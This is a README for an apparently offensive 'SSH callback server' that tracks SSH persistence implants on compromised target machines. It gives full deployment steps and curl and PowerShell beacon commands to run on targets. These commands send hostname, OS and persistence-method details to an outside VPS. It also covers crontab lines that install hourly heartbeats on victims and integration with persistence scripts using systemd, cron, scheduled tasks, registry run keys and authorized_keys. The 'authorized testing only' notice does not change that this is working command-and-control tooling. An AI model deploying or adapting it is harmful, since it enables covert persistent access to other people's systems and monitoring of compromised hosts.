# POLYGOTTEM SSH Callback Server

**Lightweight Docker-based callback server to register and verify SSH persistence installations**

Perfect for VPS deployment with no CGNAT restrictions.

---

## 🎯 Features

- ✅ **HTTP/HTTPS Callback Endpoint** - Register SSH installations
- ✅ **Real-Time Dashboard** - View callbacks in web browser
- ✅ **SQLite Database** - Persistent storage
- ✅ **API Key Authentication** - Secure access
- ✅ **Heartbeat System** - Track active connections
- ✅ **Statistics & Analytics** - Monitor SSH deployments
- ✅ **Docker Ready** - One-command deployment
- ✅ **Optional Nginx+SSL** - HTTPS support with Let's Encrypt
- ✅ **Lightweight** - Only ~50MB container

---

## 🚀 Quick Start

### 1. Prerequisites

- Docker and Docker Compose installed
- VPS with public IP (no CGNAT)
- Open port 5000 (or your chosen port)

### 2. Setup

```bash
# Clone/navigate to the directory
cd docker/ssh-callback-server

# Create .env file
cp .env.example .env

# Generate secure API key
openssl rand -base64 32

# Edit .env and set your API_KEY
nano .env

# Build and start
docker-compose up -d

# View logs
docker-compose logs -f
```

### 3. Access Dashboard

Open your browser:
```
http://YOUR_VPS_IP:5000/
```

Enter your API key to view the dashboard.

---

## 📡 API Endpoints

### 1. Register SSH Callback

**POST** `/api/register`

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "YOUR_API_KEY",
    "hostname": "target-server",
    "username": "root",
    "ssh_port": 22,
    "os_type": "linux",
    "os_version": "Ubuntu 22.04",
    "architecture": "x86_64",
    "environment": "cloud_aws",
    "init_system": "systemd",
    "ssh_implementation": "openssh",
    "persistence_methods": ["systemd_service", "cron_job"]
  }' \
  http://YOUR_VPS_IP:5000/api/register
```

**Response:**
```json
{
  "status": "success",
  "message": "SSH callback registered",
  "callback_id": 1,
  "timestamp": "2025-11-18T12:34:56.789Z"
}
```

### 2. Send Heartbeat

**POST** `/api/heartbeat`

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "YOUR_API_KEY",
    "hostname": "target-server"
  }' \
  http://YOUR_VPS_IP:5000/api/heartbeat
```

### 3. Get All Callbacks

**GET** `/api/callbacks`

```bash
curl -H "X-API-Key: YOUR_API_KEY" \
  http://YOUR_VPS_IP:5000/api/callbacks?limit=100
```

### 4. Get Statistics

**GET** `/api/stats`

```bash
curl -H "X-API-Key: YOUR_API_KEY" \
  http://YOUR_VPS_IP:5000/api/stats
```

---

## 🔧 Integration with SSH Persistence Modules

### Method 1: Using Client Script

```bash
# On target system (after SSH persistence installation)
python3 client_callback.py \
  --server http://YOUR_VPS_IP:5000 \
  --api-key YOUR_API_KEY \
  --auto-detect
```

### Method 2: Direct Integration

Add to your SSH persistence scripts:

**Linux:**
```bash
# After successful SSH installation
curl -X POST \
  -H "Content-Type: application/json" \
  -d "{
    \"api_key\":\"YOUR_API_KEY\",
    \"hostname\":\"$(hostname)\",
    \"os_type\":\"linux\",
    \"ssh_port\":22
  }" \
  http://YOUR_VPS_IP:5000/api/register
```

**Windows (PowerShell):**
```powershell
# After successful SSH installation
$body = @{
    api_key = "YOUR_API_KEY"
    hostname = $env:COMPUTERNAME
    os_type = "windows"
    ssh_port = 22
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://YOUR_VPS_IP:5000/api/register" `
  -Method POST `
  -ContentType "application/json" `
  -Body $body
```

### Method 3: Cron Heartbeat (Linux)

```bash
# Add to crontab for hourly heartbeats
0 * * * * curl -X POST -H "Content-Type: application/json" -d '{"api_key":"YOUR_KEY","hostname":"'$(hostname)'"}' http://YOUR_VPS:5000/api/heartbeat >/dev/null 2>&1
```

---

## 🔐 HTTPS/SSL Setup (Optional)

### Using Let's Encrypt (Recommended)

1. **Install Certbot on VPS:**
```bash
sudo apt-get install certbot
```

2. **Obtain SSL Certificate:**
```bash
sudo certbot certonly --standalone -d your-domain.com
```

3. **Copy Certificates:**
```bash
mkdir -p ssl
sudo cp /etc/letsencrypt/live/your-domain.com/fullchain.pem ssl/cert.pem
sudo cp /etc/letsencrypt/live/your-domain.com/privkey.pem ssl/key.pem
sudo chmod 644 ssl/*
```

4. **Enable Nginx:**
```bash
docker-compose --profile with-nginx up -d
```

5. **Access via HTTPS:**
```
https://your-domain.com/
```

### Using Self-Signed Certificate

```bash
# Generate self-signed cert
mkdir -p ssl
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout ssl/key.pem -out ssl/cert.pem \
  -subj "/CN=your-vps-ip"

# Enable Nginx
docker-compose --profile with-nginx up -d
```

---

## 📊 Dashboard Features

The web dashboard provides:

- **Real-Time Statistics**:
  - Total callbacks
  - Unique IPs
  - Verified connections
  - Last 24 hours activity

- **Callback Table**:
  - Timestamp
  - IP address
  - Hostname
  - OS information
  - SSH port
  - Environment type
  - Verification status
  - Last seen time

- **API Documentation**:
  - Complete endpoint reference
  - Example curl commands

---

## 🐳 Docker Commands

```bash
# Start server
docker-compose up -d

# Stop server
docker-compose down

# View logs
docker-compose logs -f

# Restart server
docker-compose restart

# Update container
docker-compose pull && docker-compose up -d

# Clean rebuild
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

---

## 💾 Data Persistence

All callback data is stored in `./data/ssh_callbacks.db` (SQLite database).

**Backup database:**
```bash
# Backup
cp data/ssh_callbacks.db data/ssh_callbacks.backup.$(date +%Y%m%d).db

# Restore
docker-compose down
cp data/ssh_callbacks.backup.YYYYMMDD.db data/ssh_callbacks.db
docker-compose up -d
```

**Export to JSON:**
```bash
sqlite3 data/ssh_callbacks.db \
  "SELECT json_group_array(json_object(
    'timestamp', timestamp,
    'ip_address', ip_address,
    'hostname', hostname,
    'os_type', os_type
  )) FROM ssh_callbacks" > callbacks.json
```

---

## 🔒 Security Best Practices

1. **Use Strong API Key**:
   ```bash
   # Generate secure key
   openssl rand -base64 32
   ```

2. **Enable HTTPS**:
   - Use Let's Encrypt for production
   - Always use HTTPS for public VPS

3. **Firewall Rules**:
   ```bash
   # Allow only necessary ports
   sudo ufw allow 80/tcp
   sudo ufw allow 443/tcp
   sudo ufw enable
   ```

4. **Rate Limiting**:
   - Nginx config includes rate limiting (10 req/s)

5. **Regular Backups**:
   ```bash
   # Daily backup cron
   0 2 * * * cp /path/to/data/ssh_callbacks.db /path/to/backups/ssh_callbacks.$(date +\%Y\%m\%d).db
   ```

6. **Update Regularly**:
   ```bash
   docker-compose pull
   docker-compose up -d
   ```

---

## 🧪 Testing

### Test Callback Registration

```bash
# Test with sample data
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "YOUR_API_KEY",
    "hostname": "test-server",
    "os_type": "linux",
    "ssh_port": 22
  }' \
  http://localhost:5000/api/register
```

### Test Heartbeat

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "YOUR_API_KEY",
    "hostname": "test-server"
  }' \
  http://localhost:5000/api/heartbeat
```

### Test Health Check

```bash
curl http://localhost:5000/health
```

---

## 📈 Monitoring

### View Container Stats

```bash
docker stats polygottem-ssh-callback
```

### View Container Logs

```bash
# Follow logs
docker-compose logs -f

# Last 100 lines
docker-compose logs --tail=100

# Specific service
docker-compose logs ssh-callback-server
```

### Database Size

```bash
du -h data/ssh_callbacks.db
```

---

## 🛠️ Troubleshooting

### Port Already in Use

```bash
# Change external port in docker-compose.yml
ports:
  - "8080:5000"  # Use port 8080 instead
```

### Container Won't Start

```bash
# Check logs
docker-compose logs

# Rebuild
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

### API Key Not Working

```bash
# Check .env file
cat .env

# Restart container
docker-compose restart
```

### Database Locked

```bash
# Stop container
docker-compose down

# Check database
sqlite3 data/ssh_callbacks.db "PRAGMA integrity_check;"

# Restart
docker-compose up -d
```

---

## 📝 Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `API_KEY` | auto-generated | Authentication key |
| `PORT` | 5000 | Internal port |
| `DB_PATH` | /data/ssh_callbacks.db | Database path |

---

## 🌐 Production Deployment Checklist

- [ ] Generate strong API key
- [ ] Set up SSL certificates (Let's Encrypt)
- [ ] Configure firewall rules
- [ ] Enable Nginx reverse proxy
- [ ] Set up automated backups
- [ ] Configure monitoring/alerts
- [ ] Test callback endpoint
- [ ] Test heartbeat endpoint
- [ ] Verify dashboard access
- [ ] Document API key securely

---

## 📋 Example Use Cases

### 1. Verify SSH Persistence Installation

```bash
# After installing SSH persistence on target
python3 client_callback.py \
  --server https://callback.example.com \
  --api-key abc123 \
  --auto-detect
```

### 2. Monitor Active SSH Connections

```bash
# Set up hourly heartbeat on target
echo "0 * * * * python3 /path/to/client_callback.py --server https://callback.example.com --api-key abc123 --heartbeat" | crontab -
```

### 3. Track Multi-Platform Deployments

Deploy callback server once, receive callbacks from:
- Linux (all distributions)
- Windows (all versions)
- macOS systems
- Containers (Docker/LXC)
- Cloud instances (AWS/Azure/GCP)

---

## 🤝 Integration Examples

### Integration with POLYGOTTEM SSH Modules

**Linux:**
```bash
# After successful installation
python3 ssh_persistence_linux_enhanced.py --install-all

# Send callback
python3 client_callback.py \
  --server http://YOUR_VPS:5000 \
  --api-key YOUR_KEY \
  --auto-detect \
  --persistence-methods systemd_service cron_job authorized_keys
```

**Windows:**
```powershell
# After successful installation
python ssh_persistence_windows_enhanced.py --install-all

# Send callback
python client_callback.py `
  --server http://YOUR_VPS:5000 `
  --api-key YOUR_KEY `
  --auto-detect `
  --persistence-methods openssh_config scheduled_task registry_run
```

---

## 📞 Support

For issues or questions:

1. Check logs: `docker-compose logs -f`
2. Verify API key in `.env`
3. Test endpoint: `curl http://localhost:5000/health`
4. Check firewall rules
5. Verify port availability

---

## ⚠️ Legal Notice

This tool is designed for **authorized security testing and research only**.

- Only use on systems you own or have explicit permission to test
- Obtain proper authorization before deployment
- Follow all applicable laws and regulations
- Use responsibly and ethically

---

## 📄 License

Research & Educational Use Only

---

**Status**: ✅ Production Ready
**Version**: 1.0.0
**Updated**: 2025-11-18
**Compatibility**: Linux, Windows, macOS
